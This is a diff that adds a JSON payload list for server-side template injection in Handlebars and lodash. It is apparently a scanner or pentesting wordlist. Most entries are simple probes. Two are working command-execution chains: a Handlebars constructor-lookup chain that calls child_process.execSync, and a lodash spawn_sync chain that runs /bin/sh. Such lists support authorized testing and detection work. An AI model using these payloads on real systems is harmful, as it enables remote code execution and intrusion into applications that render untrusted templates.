@@ -1,0 +1,62 @@
+{
+    "category": "Handlebars",
+    "keyword": "javascript",
+    "payloads": [
+      {
+        "type": "Basic Injection",
+        "tech": "handlebars",
+        "payload": "{{this}}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "handlebars",
+        "payload": "{{self}}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "handlebars",
+        "payload": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('ls -la');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"
+      },
+
+      {
+        "type": "Template Setup",
+        "tech": "lodash",
+        "payload": "const _ = require('lodash');\nstring = \"{{= username}}\"\nconst options = {\n  evaluate: /\\{\\{(.+?)\\}\\}/g,\n  interpolate: /\\{\\{=(.+?)\\}\\}/g,\n  escape: /\\{\\{-(.+?)\\}\\}/g,\n};\n\n_.template(string, options);"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "{{= _.VERSION}}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "${= _.VERSION}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "<%= _.VERSION %>"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "{{= _.templateSettings.evaluate }}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "${= _.VERSION}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "lodash",
+        "payload": "<%= _.VERSION %>"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "lodash",
+        "payload": "{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\",\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}"
+      }
+    ]
+  }
